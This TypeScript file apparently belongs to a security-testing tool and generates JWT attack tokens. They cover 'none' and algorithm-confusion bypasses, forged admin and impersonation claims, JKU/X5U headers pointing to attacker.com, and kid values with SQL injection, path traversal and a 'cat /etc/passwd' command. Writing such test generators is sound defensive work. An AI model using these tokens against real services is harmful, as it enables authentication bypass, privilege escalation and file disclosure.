/**
 * Copyright (c) 2026 FinkTech
 *
 * This file is part of MCP Verify.
 * Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
 * See LICENSE file in the project root for full license information.
 */
/**
 * JWT Attack Generator
 *
 * Generates malicious JWT tokens to test authentication vulnerabilities:
 * - Algorithm "none" attack (CVE-2015-9235)
 * - Algorithm confusion (RS256 -> HS256)
 * - Weak secret brute force candidates
 * - Missing/expired claims
 * - Signature stripping
 * - Key injection in header
 *
 * These payloads work with WeakIdDetector to identify JWT vulnerabilities.
 */

import {
  IPayloadGenerator,
  GeneratorConfig,
  GeneratedPayload
} from './generator.interface';

export interface JwtAttackConfig extends GeneratorConfig {
  /** Include algorithm confusion attacks */
  includeAlgConfusion?: boolean;
  /** Include claim manipulation attacks */
  includeClaimAttacks?: boolean;
  /** Include header injection attacks */
  includeHeaderInjection?: boolean;
  /** Custom claims to inject */
  customClaims?: Record<string, unknown>;
  /** Target audience/issuer for crafted tokens */
  targetAudience?: string;
  targetIssuer?: string;
}

export class JwtAttackGenerator implements IPayloadGenerator {
  readonly id = 'jwt-attack';
  readonly name = 'JWT Attack Generator';
  readonly category = 'authentication';
  readonly description = 'Generates malicious JWT tokens to test authentication bypass vulnerabilities';

  private config: JwtAttackConfig;

  constructor(config: JwtAttackConfig = {}) {
    this.config = {
      includeAlgConfusion: config.includeAlgConfusion ?? true,
      includeClaimAttacks: config.includeClaimAttacks ?? true,
      includeHeaderInjection: config.includeHeaderInjection ?? true,
      customClaims: config.customClaims ?? {},
      targetAudience: config.targetAudience,
      targetIssuer: config.targetIssuer,
      ...config
    };
  }

  generate(config?: GeneratorConfig): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const maxPayloads = config?.maxPayloads ?? 50;

    // Algorithm "none" attacks
    payloads.push(...this.generateAlgNoneAttacks());

    // Algorithm confusion attacks
    if (this.config.includeAlgConfusion) {
      payloads.push(...this.generateAlgConfusionAttacks());
    }

    // Claim manipulation attacks
    if (this.config.includeClaimAttacks) {
      payloads.push(...this.generateClaimAttacks());
    }

    // Header injection attacks
    if (this.config.includeHeaderInjection) {
      payloads.push(...this.generateHeaderInjectionAttacks());
    }

    // Signature attacks
    payloads.push(...this.generateSignatureAttacks());

    // Weak secret attacks
    payloads.push(...this.generateWeakSecretAttacks());

    return payloads.slice(0, maxPayloads);
  }

  // ==================== ALGORITHM NONE ATTACKS ====================

  private generateAlgNoneAttacks(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];

    // Standard payload for admin access
    const adminPayload = {
      sub: '1234567890',
      name: 'Admin User',
      admin: true,
      role: 'administrator',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };

    // Various "none" algorithm variations
    const noneVariations = [
      'none',
      'None',
      'NONE',
      'nOnE',
      'none ',    // trailing space
      ' none',    // leading space
      'none\x00', // null byte
    ];

    for (const alg of noneVariations) {
      const header = { alg, typ: 'JWT' };
      const token = this.createToken(header, adminPayload, '');

      payloads.push({
        value: token,
        category: 'jwt-attack',
        type: 'alg-none',
        severity: 'critical',
        description: `JWT with algorithm "${alg}" - attempts to bypass signature verification`,
        expectedVulnerableBehavior: 'Server accepts token without signature verification',
        tags: ['authentication', 'bypass', 'cve-2015-9235'],
        metadata: { algorithm: alg, cve: 'CVE-2015-9235' }
      });
    }

    // Empty algorithm
    payloads.push({
      value: this.createToken({ alg: '', typ: 'JWT' }, adminPayload, ''),
      category: 'jwt-attack',
      type: 'alg-empty',
      severity: 'critical',
      description: 'JWT with empty algorithm string',
      expectedVulnerableBehavior: 'Server accepts token with empty algorithm',
      tags: ['authentication', 'bypass']
    });

    return payloads;
  }

  // ==================== ALGORITHM CONFUSION ATTACKS ====================

  private generateAlgConfusionAttacks(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];

    const adminPayload = {
      sub: 'admin',
      role: 'admin',
      admin: true,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };

    // HS256 with common public keys as secret
    // If server uses RS256 and we can get the public key, we can sign with it using HS256
    const fakeSignatures = [
      'public-key-here',
      'secret',
      '-----BEGIN PUBLIC KEY-----',
      'your-256-bit-secret',
    ];

    for (const secret of fakeSignatures) {
      const header = { alg: 'HS256', typ: 'JWT' };
      // Create token with a fake HS256 signature
      const token = this.createToken(header, adminPayload, this.fakeHs256Signature(secret));

      payloads.push({
        value: token,
        category: 'jwt-attack',
        type: 'alg-confusion',
        severity: 'critical',
        description: 'JWT algorithm confusion attack (RS256 -> HS256)',
        expectedVulnerableBehavior: 'Server accepts HS256 token when expecting RS256',
        tags: ['authentication', 'bypass', 'algorithm-confusion'],
        metadata: { expectedAlg: 'RS256', usedAlg: 'HS256' }
      });
    }

    // HS384/HS512 downgrade
    for (const alg of ['HS384', 'HS512']) {
      payloads.push({
        value: this.createToken({ alg, typ: 'JWT' }, adminPayload, this.randomSignature()),
        category: 'jwt-attack',
        type: 'alg-downgrade',
        severity: 'high',
        description: `JWT algorithm downgrade to ${alg}`,
        expectedVulnerableBehavior: 'Server accepts weaker algorithm',
        tags: ['authentication', 'downgrade']
      });
    }

    return payloads;
  }

  // ==================== CLAIM MANIPULATION ATTACKS ====================

  private generateClaimAttacks(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const baseHeader = { alg: 'HS256', typ: 'JWT' };

    // Privilege escalation claims
    const privilegePayloads = [
      { role: 'admin', admin: true, is_admin: true },
      { role: 'superuser', permissions: ['*'] },
      { role: 'root', sudo: true },
      { groups: ['admin', 'wheel', 'sudo'] },
      { scope: 'admin read write delete' },
      { authorities: ['ROLE_ADMIN', 'ROLE_SUPERUSER'] },
    ];

    for (const claims of privilegePayloads) {
      const payload = {
        sub: 'attacker',
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 86400,
        ...claims
      };

      payloads.push({
        value: this.createToken(baseHeader, payload, this.randomSignature()),
        category: 'jwt-attack',
        type: 'privilege-escalation',
        severity: 'high',
        description: `JWT with elevated privileges: ${Object.keys(claims).join(', ')}`,
        expectedVulnerableBehavior: 'Server grants elevated access based on claims',
        tags: ['authentication', 'privilege-escalation'],
        metadata: { injectedClaims: claims }
      });
    }

    // Token with no expiration
    payloads.push({
      value: this.createToken(baseHeader, {
        sub: 'attacker',
        admin: true,
        iat: Math.floor(Date.now() / 1000)
        // No exp claim
      }, this.randomSignature()),
      category: 'jwt-attack',
      type: 'no-expiration',
      severity: 'medium',
      description: 'JWT without expiration claim',
      expectedVulnerableBehavior: 'Server accepts token that never expires',
      tags: ['authentication', 'session-management']
    });

    // Token with far-future expiration
    payloads.push({
      value: this.createToken(baseHeader, {
        sub: 'attacker',
        admin: true,
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * 100) // 100 years
      }, this.randomSignature()),
      category: 'jwt-attack',
      type: 'long-expiration',
      severity: 'low',
      description: 'JWT with 100-year expiration',
      expectedVulnerableBehavior: 'Server accepts extremely long-lived tokens',
      tags: ['authentication', 'session-management']
    });

    // Token for different user (IDOR via JWT)
    for (const userId of ['1', '0', 'admin', 'root', 'system']) {
      payloads.push({
        value: this.createToken(baseHeader, {
          sub: userId,
          user_id: userId,
          uid: userId,
          iat: Math.floor(Date.now() / 1000),
          exp: Math.floor(Date.now() / 1000) + 3600
        }, this.randomSignature()),
        category: 'jwt-attack',
        type: 'user-impersonation',
        severity: 'high',
        description: `JWT impersonating user: ${userId}`,
        expectedVulnerableBehavior: 'Server accepts token for different user',
        tags: ['authentication', 'idor', 'impersonation']
      });
    }

    // Issuer/audience manipulation
    if (this.config.targetIssuer || this.config.targetAudience) {
      payloads.push({
        value: this.createToken(baseHeader, {
          sub: 'attacker',
          iss: this.config.targetIssuer || 'https://trusted-issuer.com',
          aud: this.config.targetAudience || 'https://target-app.com',
          iat: Math.floor(Date.now() / 1000),
          exp: Math.floor(Date.now() / 1000) + 3600
        }, this.randomSignature()),
        category: 'jwt-attack',
        type: 'issuer-spoof',
        severity: 'high',
        description: 'JWT with spoofed issuer/audience',
        expectedVulnerableBehavior: 'Server accepts token from untrusted issuer',
        tags: ['authentication', 'trust-boundary']
      });
    }

    return payloads;
  }

  // ==================== HEADER INJECTION ATTACKS ====================

  private generateHeaderInjectionAttacks(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];

    const adminPayload = {
      sub: 'admin',
      admin: true,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };

    // JKU (JWK Set URL) injection
    payloads.push({
      value: this.createToken(
        {
          alg: 'RS256',
          typ: 'JWT',
          jku: 'https://attacker.com/.well-known/jwks.json'
        },
        adminPayload,
        this.randomSignature()
      ),
      category: 'jwt-attack',
      type: 'jku-injection',
      severity: 'critical',
      description: 'JWT with malicious JKU header pointing to attacker-controlled JWKS',
      expectedVulnerableBehavior: 'Server fetches keys from attacker URL',
      tags: ['authentication', 'ssrf', 'key-injection']
    });

    // X5U (X.509 URL) injection
    payloads.push({
      value: this.createToken(
        {
          alg: 'RS256',
          typ: 'JWT',
          x5u: 'https://attacker.com/cert.pem'
        },
        adminPayload,
        this.randomSignature()
      ),
      category: 'jwt-attack',
      type: 'x5u-injection',
      severity: 'critical',
      description: 'JWT with malicious X5U header pointing to attacker certificate',
      expectedVulnerableBehavior: 'Server fetches certificate from attacker URL',
      tags: ['authentication', 'ssrf', 'key-injection']
    });

    // JWK embedded key
    payloads.push({
      value: this.createToken(
        {
          alg: 'HS256',
          typ: 'JWT',
          jwk: {
            kty: 'oct',
            k: this.base64UrlEncode('attacker-controlled-secret')
          }
        },
        adminPayload,
        this.randomSignature()
      ),
      category: 'jwt-attack',
      type: 'jwk-injection',
      severity: 'critical',
      description: 'JWT with embedded JWK - attacker provides their own key',
      expectedVulnerableBehavior: 'Server uses attacker-provided key for verification',
      tags: ['authentication', 'key-injection']
    });

    // KID (Key ID) injection - SQL Injection via kid
    const kidInjections = [
      "' OR '1'='1",
      "' UNION SELECT 'secret' --",
      "../../../dev/null",
      "../../etc/passwd",
      "key.pem; cat /etc/passwd",
    ];

    for (const kid of kidInjections) {
      payloads.push({
        value: this.createToken(
          { alg: 'HS256', typ: 'JWT', kid },
          adminPayload,
          this.randomSignature()
        ),
        category: 'jwt-attack',
        type: 'kid-injection',
        severity: 'critical',
        description: `JWT with malicious KID header: ${kid.substring(0, 20)}...`,
        expectedVulnerableBehavior: 'Server vulnerable to injection via kid parameter',
        tags: ['authentication', 'injection', 'sqli', 'path-traversal']
      });
    }

    return payloads;
  }

  // ==================== SIGNATURE ATTACKS ====================

  private generateSignatureAttacks(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];

    const adminPayload = {
      sub: 'admin',
      admin: true,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };

    const header = { alg: 'HS256', typ: 'JWT' };

    // Empty signature
    payloads.push({
      value: this.createToken(header, adminPayload, ''),
      category: 'jwt-attack',
      type: 'empty-signature',
      severity: 'high',
      description: 'JWT with empty signature',
      expectedVulnerableBehavior: 'Server accepts token without signature',
      tags: ['authentication', 'bypass']
    });

    // Truncated signature
    payloads.push({
      value: this.createToken(header, adminPayload, 'abc'),
      category: 'jwt-attack',
      type: 'truncated-signature',
      severity: 'medium',
      description: 'JWT with truncated signature',
      expectedVulnerableBehavior: 'Server accepts partial signature',
      tags: ['authentication', 'bypass']
    });

    // Only two parts (no signature section)
    const headerB64 = this.base64UrlEncode(JSON.stringify(header));
    const payloadB64 = this.base64UrlEncode(JSON.stringify(adminPayload));
    payloads.push({
      value: `${headerB64}.${payloadB64}`,
      category: 'jwt-attack',
      type: 'missing-signature',
      severity: 'high',
      description: 'JWT with missing signature section (only 2 parts)',
      expectedVulnerableBehavior: 'Server accepts token without signature section',
      tags: ['authentication', 'bypass']
    });

    return payloads;
  }

  // ==================== WEAK SECRET ATTACKS ====================

  private generateWeakSecretAttacks(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];

    const adminPayload = {
      sub: 'admin',
      admin: true,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };

    // Common weak secrets
    const weakSecrets = [
      'secret',
      'password',
      '123456',
      'jwt-secret',
      'your-256-bit-secret',
      'shhhhh',
      'changeme',
      'development',
      'test',
      '',
    ];

    for (const secret of weakSecrets) {
      payloads.push({
        value: this.createToken(
          { alg: 'HS256', typ: 'JWT' },
          adminPayload,
          this.fakeHs256Signature(secret)
        ),
        category: 'jwt-attack',
        type: 'weak-secret',
        severity: 'high',
        description: `JWT signed with common weak secret: "${secret || '(empty)'}"`,
        expectedVulnerableBehavior: 'Server uses weak/guessable secret',
        tags: ['authentication', 'weak-crypto'],
        metadata: { testedSecret: secret }
      });
    }

    return payloads;
  }

  // ==================== HELPERS ====================

  private createToken(
    header: Record<string, unknown>,
    payload: Record<string, unknown>,
    signature: string
  ): string {
    const headerB64 = this.base64UrlEncode(JSON.stringify(header));
    const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));
    return `${headerB64}.${payloadB64}.${signature}`;
  }

  private base64UrlEncode(str: string): string {
    return Buffer.from(str)
      .toString('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
  }

  private randomSignature(): string {
    // Generate a random-looking signature
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let result = '';
    for (let i = 0; i < 43; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  private fakeHs256Signature(secret: string): string {
    // Create a fake signature - not cryptographically valid but structured correctly
    // In a real attack, you'd use crypto.createHmac('sha256', secret)
    return this.base64UrlEncode(`fake-sig-for-${secret}-${Date.now()}`);
  }
}
